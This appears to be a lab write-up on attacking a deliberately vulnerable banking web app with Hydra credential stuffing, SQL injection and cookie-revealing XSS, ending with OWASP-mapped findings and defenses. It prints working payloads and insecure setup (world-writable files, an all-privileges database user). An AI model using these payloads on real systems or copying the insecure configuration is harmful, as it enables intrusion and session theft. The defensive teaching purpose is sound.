Overview

Lab Overview

This two-part lab covered the full lifecycle of web application attack and defense. The first lab involved setting up a deliberately vulnerable banking application — yourInsecureBank — on an Apache/MySQL server running on Ubuntu SEED, providing a controlled target for attack. The second lab launched three classes of real-world web application attacks against it: credential stuffing with Hydra, SQL injection to bypass authentication and exfiltrate database content, and cross-site scripting (XSS) to execute arbitrary JavaScript and steal session cookies.

All three attack categories map directly to the OWASP Top 10 — the industry standard classification of the most critical web application security risks.

Credential Stuffing

  • Used crunch for constrained password generation
  • Automated login attacks with Hydra
  • Cracked valid account credentials

  • Exploited persistent XSS in guestbook
  • Exfiltrated session cookie via XSS

Methodology

Methodology

Setup — Hosting yourInsecureBank on Apache

The yourInsecureBank PHP application was deployed on Ubuntu SEED's Apache web server, configured as a named virtual host at www.yourInsecureBank.net. A MySQL database was provisioned with a dedicated user and populated using a SQL seed script. The hosts file on both VMs was updated to resolve the domain to the Ubuntu VM's IP.

Apache Virtual Host & Database Setup

# Deploy app to Apache web root sudo cp -R yourInsecureBank /var/www/html sudo chmod -R 777 yourInsecureBank/ sudo chown -R seed yourInsecureBank/ # Create MySQL user and database CREATE USER 'cyber'@'localhost' IDENTIFIED BY 'security'; GRANT ALL PRIVILEGES ON *.* TO 'cyber'@'localhost'; mysqladmin -u cyber -p create yourinsecurebank mysql -u cyber -p yourinsecurebank < create-populate-yourinsecurebank.sql

Attack 1 — Credential Stuffing with Hydra

A username list and a constrained password list were generated — crunch was used to produce all 5-character numeric passwords starting with 1, ending with 5, with 3 fixed as the third character. Hydra then automated HTTP GET form submissions against the login page, detecting success by the absence of the error string.

Credential Stuffing — Wordlist Generation & Hydra Attack

# Generate constrained password list with crunch (e.g. 1?3?5) crunch 5 5 -f /usr/share/crunch/charset.lst numeric -t 1@3@5 -o passwords.lst # Launch HTTP form attack with Hydra hydra -L usernames.lst -P passwords.lst www.yourinsecurebank.net \ http-form-get "/accounts.php:name=^USER^&password=^PASS^&Submit=Submit: \ Unrecognized username and/or password."

Attack 2 — SQL Injection

Source code review of accounts.php revealed the raw SQL query used for authentication — string input was concatenated directly into the query with no parameterization or sanitization. Two injection payloads were crafted and tested.

SQL Injection Payloads

# Vulnerable query (from source code review) SELECT username, customerID FROM users WHERE username="[input]" and password="[input]"; # Payload 1 — Authentication bypass via OR injection Username: uvu' or 'x'='x';-- Password: 123 # Resulting query ignores password check entirely — returns all users # Payload 2 — UNION SELECT to exfiltrate database info Username: Basil' union select "Vulnerable!",database(),null;-- Password: 123 # Returns database name alongside injected string in the response

SQL injection was also demonstrated against testphp.vulnweb.com via a URL parameter — changing the cat parameter to 1 or 2 returned unexpected records, and a full UNION SELECT payload in the URL exfiltrated the database user, name, version, and OS from the live vulnerable site.

Attack 3 — Cross-Site Scripting (XSS)

Input validation was first probed by submitting an HTML tag (<uvu;/>) in the username field. The tag appeared unescaped in the response URL, confirming a lack of input sanitization. A JavaScript alert payload was then injected to demonstrate reflected XSS.

XSS Payloads

# Reflected XSS — login form username field Username: ' or <script>alert("Just a proof of concept")</script> # Triggers JavaScript alert popup in the victim's browser # Stored XSS — guestbook field on testphp.vulnweb.com <script>alert('xss poc!')</script> # Payload persists in database; executes for every visitor # Cookie theft via stored XSS <script>alert(document.cookie)</script> # Displays session cookie — in a real attack, sent to attacker's server

Findings

Key Findings

Finding 1 — Hydra Cracked Valid Credentials Automatically OWASP A07

The Hydra dictionary attack successfully identified a valid username/password pair from the generated wordlists. Applications with no rate limiting, CAPTCHA, or account lockout policy are trivially vulnerable to automated credential attacks — even with constrained wordlists a fraction of the size of a real breach dataset.

Finding 2 — Unsanitized SQL Allowed Full Authentication Bypass OWASP A03

The OR 'x'='x' injection bypassed authentication entirely and returned all user records. The UNION SELECT payload went further — injecting attacker-controlled strings directly into the application response alongside the database name. Parameterized queries (prepared statements) would have prevented both attacks completely.

Finding 3 — Stored XSS Persists and Affects All Visitors OWASP A03

The guestbook XSS payload was stored in the database and executed for every subsequent visitor — not just the attacker. The document.cookie payload demonstrated that session tokens are exposed to JavaScript by default. The HttpOnly cookie flag would have blocked this specific exfiltration path.

Finding 4 — URL Parameters Are an Attack Surface OWASP A03

The testphp.vulnweb.com URL parameter injection required no authentication, no tools, and no special knowledge — just a modified URL in a browser. Any user-supplied input that flows into a database query without sanitization is a potential injection point, including query strings, form fields, headers, and cookies.

Takeaways

Lessons & Takeaways

This lab demonstrated three of the most enduring and prevalent web application vulnerability classes in a hands-on, end-to-end context. All three attacks — credential stuffing, SQLi, and XSS — remain in the OWASP Top 10 because they are so consistently found in real applications, often due to the same root causes: lack of input validation, missing output encoding, and absent rate limiting.

Key defensive controls: use parameterized queries / prepared statements to eliminate SQL injection; implement output encoding and Content Security Policy (CSP) headers to mitigate XSS; set HttpOnly and Secure flags on session cookies; enforce rate limiting, CAPTCHA, and account lockout policies to defeat automated credential attacks; and conduct regular security code reviews and DAST scanning against all web-facing applications.
